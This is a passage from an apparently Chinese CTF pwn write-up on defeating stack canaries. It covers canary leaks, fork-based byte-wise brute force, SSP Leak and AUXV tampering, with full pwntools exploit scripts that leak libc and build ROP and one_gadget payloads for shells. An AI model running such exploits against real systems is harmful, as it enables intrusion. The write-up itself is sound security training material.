/lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fd7000 0x00007ffff7fda000 rw-p    mapped0x00007ffff7ff7000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffdd000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><p>最后放上 exp：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *# context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;local = 0if local:    p = process(&#39;./microwave&#39;)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    libc_base_offset = 0xf72c0    one_gadget_offset = 0x45216else:    p = remote(&#39;127.0.0.1&#39;, 1337)    libc = ELF(&#39;./libc.so.6&#39;)    libc_base_offset = 0xeb870    one_gadget_offset = 0x464d8elf = ELF(&#39;./microwave&#39;)log.success(&#39;libc_base_offset = &#39; + hex(libc_base_offset))log.success(&#39;one_gadget_offset = &#39; + hex(one_gadget_offset))def connect(username, password):    p.sendlineafter(&#39;[MicroWave]:&#39;, &#39;1&#39;)    p.sendlineafter(&#39;username:&#39;, username)    p.sendlineafter(&#39;password:&#39;, password)def edit(content):    p.sendlineafter(&#39;[MicroWave]:&#39;, &#39;2&#39;)    p.sendlineafter(&#39;#&gt;&#39;, content)def tweet():    p.sendlineafter(&#39;[MicroWave]:&#39;, &#39;3&#39;)def quit():    p.sendlineafter(&#39;[MicroWave]:&#39;, &#39;q&#39;)# gdb.attach(p)password = &#39;n07_7h3_fl46&#39;connect(&#39;%p.&#39; * 8, password)p.recvuntil(&#39;Checking&#39;)leak_data = p.recvline().strip().split(&#39;.&#39;)[:-1]print leak_datacanary = int(leak_data[5][2:], 16)log.success(&#39;canary = &#39; + hex(canary))leak_libc = int(leak_data[1][2:], 16)log.success(&#39;leak_libc = &#39; + hex(leak_libc))libc_base = leak_libc - libc_base_offsetlog.success(&#39;libc_base = &#39; + hex(libc_base))one_gadget = libc_base + one_gadget_offsetlog.success(&#39;one_gadget = &#39; + hex(one_gadget))payload = flat([    &#39;A&#39; * 1032,    canary,    &#39;B&#39; * 8,    one_gadget])edit(payload)p.interactive()</code></pre><h3 id="2017-CSAW-Quals-scv"><a href="#2017-CSAW-Quals-scv" class="headerlink" title="2017-CSAW-Quals-scv"></a>2017-CSAW-Quals-scv</h3><p>开了 <code>Canary</code>：</p><pre><code>[*] &#39;/home/assassinq/pwn/ctf-wiki/canary/2017-CSAW-Quals-csv/scv&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>就只有一个 main 函数，由于是 c++ 程序，看起来有点混乱：</p><pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  __int64 v3; // rax  __int64 v4; // rax  __int64 v5; // rax  __int64 v6; // rax  __int64 v7; // rax  __int64 v8; // rax  __int64 v9; // rax  __int64 v10; // rax  __int64 v11; // rax  __int64 v12; // rax  __int64 v13; // rax  __int64 v14; // rax  __int64 v15; // rax  __int64 v16; // rax  __int64 v17; // rax  __int64 v18; // rax  __int64 v19; // rax  __int64 v20; // rax  __int64 v21; // rax  int choice; // [rsp+4h] [rbp-BCh]  int v24; // [rsp+8h] [rbp-B8h]  int v25; // [rsp+Ch] [rbp-B4h]  char buf; // [rsp+10h] [rbp-B0h]  unsigned __int64 v27; // [rsp+B8h] [rbp-8h]  v27 = __readfsqword(0x28u);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  choice = 0;  v24 = 1;  v25 = 0;  while ( v24 )  {    v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------&quot;);    std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;[*]SCV GOOD TO GO,SIR....&quot;);    std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------&quot;);    std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;1.FEED SCV....&quot;);    std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;2.REVIEW THE FOOD....&quot;);    std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v8 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;3.MINE MINERALS....&quot;);    std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v9 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------&quot;);    std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;&gt;&gt;&quot;);    std::istream::operator&gt;&gt;(&amp;std::cin, &amp;choice);    switch ( choice )    {      case 2:                                   // show        v15 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------&quot;);        std::ostream::operator&lt;&lt;(v15, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        v16 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;[*]REVIEW THE FOOD...........&quot;);        std::ostream::operator&lt;&lt;(v16, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        v17 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------&quot;);        std::ostream::operator&lt;&lt;(v17, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        v18 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;[*]PLEASE TREAT HIM WELL.....&quot;);        std::ostream::operator&lt;&lt;(v18, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        v19 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------&quot;);        std::ostream::operator&lt;&lt;(v19, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        puts(&amp;buf);        break;      case 3:                                   // exit        v24 = 0;        v20 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;[*]BYE ~ TIME TO MINE MIENRALS...&quot;);        std::ostream::operator&lt;&lt;(v20, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        break;      case 1:                                   // edit        v10 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------&quot;);        std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        v11 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;[*]SCV IS ALWAYS HUNGRY.....&quot;);        std::ostream::operator&lt;&lt;(v11, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        v12 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------&quot;);        std::ostream::operator&lt;&lt;(v12, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        v13 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;[*]GIVE HIM SOME FOOD.......&quot;);        std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        v14 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------&quot;);        std::ostream::operator&lt;&lt;(v14, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;&gt;&gt;&quot;);        v25 = read(0, &amp;buf, 0xF8uLL);        break;      default:        v21 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;[*]DO NOT HURT MY SCV....&quot;);        std::ostream::operator&lt;&lt;(v21, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        break;    }  }  return 0LL;}</code></pre><p>在 <code>case 1</code> 存在 <code>buffer overflow</code>，通过调试观察到输入与 <code>Canary</code> 之间的偏移为 168。如果要泄漏 <code>Canary</code> 的话，就必须让所有的 <code>\x00</code> 被覆盖掉，包括 <code>Canary</code> 低位的 <code>\x00</code>，以让 <code>puts</code> 认为 buf 连同 <code>Canary</code> 为一个字符串。libc 也可以用同样的方式泄漏，最后放上 exp：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *# context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;local = 1if local:    p = process(&#39;./scv&#39;, env={&#39;LD_PRELOAD&#39;:&#39;./libc-2.23.so&#39;})else:    p = remote(&#39;127.0.0.1&#39;, 8888)libc = ELF(&#39;./libc-2.23.so&#39;)elf = ELF(&#39;./scv&#39;)# gdb.attach(p)system_offset = libc.symbols[&#39;system&#39;]str_bin_sh_offset = next(libc.search(&#39;/bin/sh&#39;))log.success(&#39;system_offset = &#39; + hex(system_offset))log.success(&#39;str_bin_sh_offset = &#39; + hex(str_bin_sh_offset))pop_rdi_ret = 0x0000000000400ea3log.success(&#39;pop_rdi_ret = &#39; + hex(pop_rdi_ret))one_gadget_offset = 0x45216log.success(&#39;one_gadget_offset = &#39; + hex(one_gadget_offset))libc_base_offset = 0x3a20alog.success(&#39;libc_base_offset = &#39; + hex(libc_base_offset))def edit(content):    p.sendlineafter(&#39;&gt;&gt;&#39;, &#39;1&#39;)    p.recvuntil(&#39;&gt;&gt;&#39;)    p.send(content)def show():    p.sendlineafter(&#39;&gt;&gt;&#39;, &#39;2&#39;)def quit():    p.sendlineafter(&#39;&gt;&gt;&#39;, &#39;3&#39;)edit(&#39;A&#39; * (40 - 1) + &#39;:&#39;)show()p.recvuntil(&#39;:&#39;)leak_addr = u64(p.recv(6).ljust(8, &#39;\x00&#39;))log.success(&#39;leak_addr = &#39; + hex(leak_addr))libc_base = leak_addr - libc_base_offsetlog.success(&#39;libc_base = &#39; + hex(libc_base))system = libc_base + str_bin_sh_offsetstr_bin_sh = libc_base + str_bin_sh_offsetlog.success(&#39;system = &#39; + hex(system))log.success(&#39;str_bin_sh = &#39; + hex(str_bin_sh))edit(&#39;A&#39; * 168 + &#39;:&#39;)show()p.recvuntil(&#39;:&#39;)canary = u64(&#39;\x00&#39; + p.recv(7))log.success(&#39;canary = &#39; + hex(canary))payload = flat([    &#39;A&#39; * 168,    canary,    &#39;B&#39; * 8,    pop_rdi_ret,    str_bin_sh,    system])edit(payload)quit()p.interactive()</code></pre><h2 id="爆破-Canary"><a href="#爆破-Canary" class="headerlink" title="爆破 Canary"></a>爆破 <code>Canary</code></h2><p><code>Canary</code> 之所以被认为是安全的，是因为对其进行爆破成功率太低。以 32 位程序为例，除去最后一个 <code>\x00</code>，其可能值将会是 <code>0x100^3=16777216</code>（实际上由于 <code>Canary</code> 的生成规则会小于这个值），64 位下的<code>Canary</code> 值更是远大于这个数量级。此外，一旦 <code>Canary</code> 爆破失败，程序就会立即结束，<code>Canary</code> 值也会再次更新，使得爆破更加困难。但是同一个进程内所有的 <code>Canary</code> 值都是一致的，当程序有多个进程，且子进程内出现了栈溢出时，由于子进程崩溃不会影响到主进程，我们就可以进行爆破。甚至我们可以通过逐位爆破来减少爆破时间。</p><h3 id="2017-NSCTF-pwn2"><a href="#2017-NSCTF-pwn2" class="headerlink" title="2017-NSCTF-pwn2"></a>2017-NSCTF-pwn2</h3><pre><code class="shell">[*] &#39;/home/assassinq/pwn/ctf-wiki/canary/2017-NSCTF-pwn2/pwn2&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>开启了 <code>Canary</code>。main 函数中看到只要每次回答 <code>Y</code>，可以无限次地 fork 出新的进程：</p><pre><code class="cpp">int __cdecl main(){  char v1; // [esp+1Bh] [ebp-5h]  __pid_t pid; // [esp+1Ch] [ebp-4h]  setbuf(stdin, 0);  setbuf(stdout, 0);  setbuf(stderr, 0);  while ( 1 )  {    write(1, &quot;[*] Do you love me?[Y]\n&quot;, 0x17u);    if ( getchar() != &#39;Y&#39; )      break;    v1 = getchar();    while ( v1 != &#39;\n&#39; &amp;&amp; v1 )      ;    pid = fork();    if ( pid )    {      if ( pid &lt;= 0 )      {        if ( pid &lt; 0 )          exit(0);      }      else                                      // son      {        wait(0);      }    }    else                                        // father    {      func();    }  }  return 0;}</code></pre><p><code>func()</code> 函数中存在 <code>buffer overflow</code>，而且还存在 <code>format string</code>，那这里其实是可以用这个漏洞泄漏出 <code>Canary</code> 的：</p><pre><code class="cpp">unsigned int func(){  char *s; // ST18_4  int buf; // [esp+1Ch] [ebp-1Ch]  int v3; // [esp+20h] [ebp-18h]  int v4; // [esp+24h] [ebp-14h]  int v5; // [esp+28h] [ebp-10h]  unsigned int v6; // [esp+2Ch] [ebp-Ch]  v6 = __readgsdword(0x14u);  buf = 0;  v3 = 0;  v4 = 0;  v5 = 0;  s = (char *)malloc(0x40u);  input_name(&amp;buf);  sprintf(s, &quot;[*] Welcome to the game %s&quot;, &amp;buf);  printf(s);  puts(&quot;[*] Input Your Id:&quot;);  read(0, &amp;buf, 0x100u);  return __readgsdword(0x14u) ^ v6;}</code></pre><p><code>Canary</code> 采用爆破的方法，libc 则可以用格式化字符串泄漏。放上逐字节爆破 exp：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *# context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;p = process(&#39;./pwn2&#39;, env={&#39;LD_RELOAD&#39;:&#39;./libc.so.6_x86&#39;})elf = ELF(&#39;./pwn2&#39;)libc = ELF(&#39;./libc.so.6_x86&#39;)system_offset = libc.symbols[&#39;system&#39;]str_bin_sh_offset = next(libc.search(&#39;/bin/sh&#39;))log.success(&#39;system_offset = &#39; + hex(system_offset))log.success(&#39;str_bin_sh_offset = &#39; + hex(str_bin_sh_offset))libc_offset = 0x1b2000log.success(&#39;libc_offset = &#39; + hex(libc_offset))one_gadget_offset = 0x3af1clog.success(&#39;one_gadget_offset = &#39; + hex(one_gadget_offset))# gdb.attach(p)def forkNew():    p.sendlineafter(&#39;[Y]&#39;, &#39;Y&#39;)def inputName(name):    p.recvuntil(&#39;[*] Input Your name please:&#39;)    p.send(name)def inputId(Id):    p.recvuntil(&#39;[*] Input Your Id:&#39;)    p.send(Id)canary = &#39;\x00&#39;for i in range(3):    for j in range(256):        # log.info(&#39;try &#39; + hex(j))        if i != 0 and j == 0:            p.sendline(&#39;Y&#39;)        else:            forkNew()        inputName(&#39;%12$p\n&#39;)        p.recvuntil(&#39;[*] Welcome to the game &#39;)        leak_addr = int(p.recv(10), 16)        payload = &#39;A&#39; * 16        payload += canary        payload += chr(j)        inputId(payload)        p.recv()        if &#39;smashing&#39; not in  p.recv():            canary += chr(j)            log.info(&#39;At round %d find canary byte %#x&#39; %(i, j))            breaklog.success(&#39;canary = &#39; + hex(u32(canary)))log.success(&#39;leak_addr = &#39; + hex(leak_addr))libc_base = leak_addr - libc_offsetlog.success(&#39;libc_base = &#39; + hex(libc_base))system = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetone_gadget = libc_base + one_gadget_offsetlog.success(&#39;system = &#39; + hex(system))log.success(&#39;str_bin_sh = &#39; + hex(str_bin_sh))log.success(&#39;one_gadget = &#39; + hex(one_gadget))p.sendline(&#39;Y&#39;)inputName(&#39;AssassinQ\n&#39;)payload = flat([    &#39;A&#39; * 16,    canary,    &#39;B&#39; * 12,    one_gadget])inputId(payload)p.interactive()</code></pre><h2 id="SSP（Stack-Smashing-Protect）-Leak"><a href="#SSP（Stack-Smashing-Protect）-Leak" class="headerlink" title="SSP（Stack Smashing Protect） Leak"></a><code>SSP（Stack Smashing Protect） Leak</code></h2><p>除了通过各种方法泄露 <code>Canary</code> 之外，我们还可以利用 <code>__stack_chk_fail</code> 函数泄露信息。这种方法作用不大，没办法让我们 <code>get shell</code>。但是当我们需要泄露的 flag 或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做 <code>SSP（Stack Smashing Protect） Leak</code>。</p><pre><code class="cpp">void __attribute__ ((noreturn)) __stack_chk_fail (void){  __fortify_fail (&quot;stack smashing detected&quot;);}void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg){  /* The loop is added only to keep gcc happy.  */  while (1)    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);}</code></pre><p><img src="/pics/绕过ELF的安全防护机制Canary/1.png" srcset="/img/loading.gif" alt></p><h3 id="JarvisOJ-Smashes"><a href="#JarvisOJ-Smashes" class="headerlink" title="JarvisOJ-Smashes"></a>JarvisOJ-Smashes</h3><pre><code class="shell">[*] &#39;/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)    FORTIFY:  Enabled</code></pre><p>开了 <code>Canary</code>，存在溢出但是没法泄漏：</p><pre><code class="cpp">unsigned __int64 sub_4007E0(){  __int64 i; // rbx  int c; // eax  __int64 v3; // [rsp+0h] [rbp-128h]  unsigned __int64 v4; // [rsp+108h] [rbp-20h]  v4 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;Hello!\nWhat&#39;s your name? &quot;);  if ( !_IO_gets((__int64)&amp;v3) )LABEL_9:    _exit(1);  i = 0LL;  __printf_chk(1LL, &quot;Nice to meet you, %s.\nPlease overwrite the flag: &quot;);  while ( 1 )  {    c = _IO_getc(stdin);    if ( c == -1 )      goto LABEL_9;    if ( c == &#39;\n&#39; )      break;    flag[i++] = c;    if ( i == 32 )      goto LABEL_8;  }  memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));LABEL_8:  puts(&quot;Thank you, bye!&quot;);  return __readfsqword(0x28u) ^ v4;}</code></pre><p>这里想到 <code>SSP Leak</code>，只要我们能够输入足够长的字符串覆盖掉 <code>argv[0]</code>，我们就能让 <code>Canary</code> 保护输出我们想要地址上的值：</p><pre><code>.rodata:000000000040094E ; char s[].rodata:000000000040094E s               db &#39;Thank you, bye!&#39;,0  ; DATA XREF: sub_4007E0:loc_400878↑o.rodata:000000000040095E                 align 20h</code></pre><p>尝试输出字符串 s：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;p = remote(&#39;pwn.jarvisoj.com&#39;, 9877)test = 0x40094Ep.recvuntil(&#39;What\&#39;s your name?&#39;)p.sendline(p64(test) * 200)p.recvuntil(&#39;Please overwrite the flag:&#39;)p.sendline()p.recvall()p.interactive()</code></pre><p>得到的结果果然泄漏出来了：</p><pre><code class="shell">[DEBUG] Received 0x4c bytes:    &#39;Thank you, bye!\n&#39;    &#39;*** stack smashing detected ***: Thank you, bye! terminated\n&#39;</code></pre><p>那么接下来需要做的就是找到存放 flag 的地址，在 ida 上找到是 <code>0x600d21</code>，但是由于 main 函数中最后一句话 <code>memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));</code>，在调用 <code>__stack_chk_fail()</code> 的时候，<code>0x600d21</code> 上的值早就已经被覆盖成其它值了。通过 gdb 调试，发现在另一个地址也有 flag：</p><pre><code class="gdb">assassinq&gt;&gt; find &#39;CTF&#39;Searching for &#39;CTF&#39; in: None rangesFound 2 results, display max 2 items:smashes : 0x400d21 (&quot;CTF{Here&#39;s the flag on server}&quot;)smashes : 0x600d21 (&quot;CTF{Here&#39;s the flag on server}&quot;)</code></pre><p>这里就涉及到了 elf 文件的重映射，当可执行文件足够小的时候，文件的不同区段可能会被多次映射：</p><pre><code>assassinq&gt;&gt; vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes0x00600000         0x00601000         rw-p    /home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fd7000 0x00007ffff7fda000 rw-p    mapped0x00007ffff7ff7000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><p>那么 exp 如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;p = remote(&#39;pwn.jarvisoj.com&#39;, 9877)test = 0x40094Eflag = 0x400d20p.recvuntil(&#39;What\&#39;s your name?&#39;)p.sendline(p64(flag) * 200)p.recvuntil(&#39;Please overwrite the flag:&#39;)p.sendline()p.recvall()p.interactive()</code></pre><h2 id="Auxiliary-Vector"><a href="#Auxiliary-Vector" class="headerlink" title="Auxiliary Vector"></a>Auxiliary Vector</h2><p>直接“挖”到 <code>Canary</code> 产生的本源——AUXV(Auxiliary Vector)，并修改该结构体从而使 <code>Canary</code> 值可控。</p><h3 id="2017-TCTF-Final-upxof"><a href="#2017-TCTF-Final-upxof" class="headerlink" title="2017-TCTF-Final-upxof"></a>2017-TCTF-Final-upxof</h3><pre><code class="bash">λ checksec ./upxof[*] &#39;/home/assassinq/Course_4/2017-TCTF-Final-upxof/upxof&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments    Packer:   Packed with UPX</code></pre><p>拖进 ida 里发现有壳，<code>upx -d</code> 一下：</p><pre><code class="bash">λ upx -d upxof                       Ultimate Packer for eXecutables                          Copyright (C) 1996 - 2013UPX 3.91        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Sep 30th 2013        File size         Ratio      Format      Name   --------------------   ------   -----------   -----------     10116 &lt;-      6253   61.81%  linux/ElfAMD   upxofUnpacked 1 file.</code></pre><p>main 函数长这个样子，<code>gets</code> 这里显然有一个溢出点：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [rsp+0h] [rbp-410h]  unsigned __int64 v5; // [rsp+408h] [rbp-8h]  v5 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  printf(&quot;let&#39;s go:&quot;, 0LL);  gets(&amp;v4);  return 0;}</code></pre><p>但是在尝试的时候发现这里有 <code>Canary</code>，疑惑地重新 <code>checksec</code> 一下，发现脱了壳变得不一样了：</p><pre><code class="bash">λ checksec ./upxof_no_upx[*] &#39;/home/assassinq/Course_4/2017-TCTF-Final-upxof/upxof_no_upx&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>这里又不能泄漏，于是就需要用另一种方法来搞定 <code>Canary</code>，就是改变 <code>auxv</code> 结构体中的内容。<code>auxv</code> 中包含了 <code>Canary</code> 的地址，在动态链接之前就已经确定。（<a href="https://www.elttam.com.au/blog/playing-with-canaries/" target="_blank" rel="noopener">这篇文章</a>讲得比较深入，还有 <a href="http://phrack.org/issues/58/5.html" target="_blank" rel="noopener">phrack 上也有一篇文章</a>）</p><p><code>auxv</code> 结构可以在 <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener"><code>elf/elf.h</code></a> 里看到：</p><pre><code class="cpp">/* Auxiliary vector.  *//* This vector is normally only used by the program interpreter.  The   usual definition in an ABI supplement uses the name auxv_t.  The   vector is not usually defined in a standard &lt;elf.h&gt; file, but it   can&#39;t hurt.  We rename it to avoid conflicts.  The sizes of these   types are an arrangement between the exec server and the program   interpreter, so we don&#39;t fully specify them here.  */typedef struct{  uint32_t a_type;                /* Entry type */  union    {      uint32_t a_val;                /* Integer value */      /* We use to have pointer elements added here.  We cannot do that,         though, since it does not work when using 32-bit definitions         on 64-bit platforms and vice versa.  */    } a_un;} Elf32_auxv_t;typedef struct{  uint64_t a_type;                /* Entry type */  union    {      uint64_t a_val;                /* Integer value */      /* We use to have pointer elements added here.  We cannot do that,         though, since it does not work when using 32-bit definitions         on 64-bit platforms and vice versa.  */    } a_un;} Elf64_auxv_t;</code></pre><p>自己写一个带有 <code>Canary</code> 的程序，用 gdb 调一下，<code>info auxv</code> 查看结构体的内容：</p><pre><code class="gdb">assassinq&gt;&gt; info auxv33   AT_SYSINFO_EHDR      System-supplied DSO&#39;s ELF header 0x7ffff7ffa00016   AT_HWCAP             Machine-dependent CPU capability hints 0xf8bfbff6    AT_PAGESZ            System page size               409617   AT_CLKTCK            Frequency of times()           1003    AT_PHDR              Program headers for program    0x4000404    AT_PHENT             Size of program header entry   565    AT_PHNUM             Number of program headers      97    AT_BASE              Base address of interpreter    0x7ffff7dd70008    AT_FLAGS             Flags                          0x09    AT_ENTRY             Entry point of program         0x4004a011   AT_UID               Real user ID                   100012   AT_EUID              Effective user ID              100013   AT_GID               Real group ID                  100014   AT_EGID              Effective group ID             100023   AT_SECURE            Boolean, was exec setuid-like? 025   AT_RANDOM            Address of 16 random bytes     0x7fffffffe0e931   AT_EXECFN            File name of executable        0x7fffffffefc2 &quot;/home/assassinq/Course_4/2017-TCTF-Final-upxof/canary&quot;15   AT_PLATFORM          String identifying platform    0x7fffffffe0f9 &quot;x86_64&quot;0    AT_NULL              End of vector                  0x0</code></pre><p><a href="https://my.oschina.net/ibuwai/blog/688107" target="_blank" rel="noopener">经过了解</a>，结构体中 <code>AT_RANDOM</code> 的值对应了 <code>canary</code> 的值（<code>The value is a pointer to sixteen random bytes provided by the kernel. The dynamic linker uses this to implement a stack canary</code>），可以测试一下：</p><pre><code class="gdb">assassinq&gt;&gt; x/gx 0x7fffffffe0e90x7fffffffe0e9:    0x47747e045c58c8d8assassinq&gt;&gt; canarycanary : 0x47747e045c58c800</code></pre><p>还有比较重要的是，程序一开始 <code>AT_RANDOM</code>、<code>AT_EXECFN</code>、<code>AT_PLATFORM</code> 和其他的值都会被 push 到栈上：</p><pre><code class="gdb">assassinq&gt;&gt; stack 1000...1280| 0x7fffffffe0b0 --&gt; 0x7fffffffe0e9 --&gt; 0x47747e045c58c8d81288| 0x7fffffffe0b8 --&gt; 0x1f1296| 0x7fffffffe0c0 --&gt; 0x7fffffffefc2 (&quot;/home/assassinq/Course_4/2017-TCTF-Final-upxof/canary&quot;)1304| 0x7fffffffe0c8 --&gt; 0xf1312| 0x7fffffffe0d0 --&gt; 0x7fffffffe0f9 --&gt; 0x34365f363878 (&#39;x86_64&#39;)...</code></pre><p>可以 <code>searchmem</code> 一下看到存放 <code>Canary</code> 的地方：</p><pre><code class="gdb">assassinq&gt;&gt; searchmem 0x7fffffffe0e9Searching for &#39;0x7fffffffe0e9&#39; in: None rangesFound 1 results, display max 1 items:[stack] : 0x7fffffffe0b0 --&gt; 0x7fffffffe0e9 --&gt; 0x47747e045c58c8d8assassinq&gt;&gt; searchmem 0x47747e045c58c800Searching for &#39;0x47747e045c58c800&#39; in: None rangesFound 2 results, display max 2 items: mapped : 0x7ffff7fda728 --&gt; 0x47747e045c58c800[stack] : 0x7fffffffdc78 --&gt; 